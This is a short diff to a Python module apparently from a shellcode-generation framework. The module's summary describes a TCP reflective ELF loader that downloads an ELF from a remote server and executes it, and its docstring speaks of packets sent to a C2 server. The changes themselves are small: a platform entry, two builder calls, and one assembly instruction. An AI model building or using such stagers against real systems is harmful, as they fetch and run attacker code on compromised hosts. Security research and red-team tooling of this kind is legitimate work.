@@ -25,7 +25,8 @@ class Shellcode():
 
     author = ["wetw0rk"]
 
-    tested_platforms = ["Debian 13.2.0-25"]
+    tested_platforms = ["Debian 13.2.0-25",
+                        "Ubuntu 18.04.6 LTS"]
 
     summary = ("TCP-based reflective ELF loader over IPV4 which executes an ELF from"
                " a remote server")
@@ -79,8 +80,8 @@ class Shellcode():
             "pathname"   : 0x00,
         }
 
-        self.stack_space = builder.calc_stack_space(sc_args, Shellcode.arch)
-        self.storage_offsets = builder.gen_offsets(sc_args, Shellcode.arch)
+        self.stack_space = builder.calc_stack_space(sc_args)
+        self.storage_offsets = builder.gen_offsets(sc_args)
 
     def get_ackpk_len(self):
         """Generates the size needed by the ACK packet sent to the C2 server.
@@ -316,6 +317,7 @@ execute_elf:
     syscall
 exit:
     xor rax, rax
+    leave
     ret
         """
 
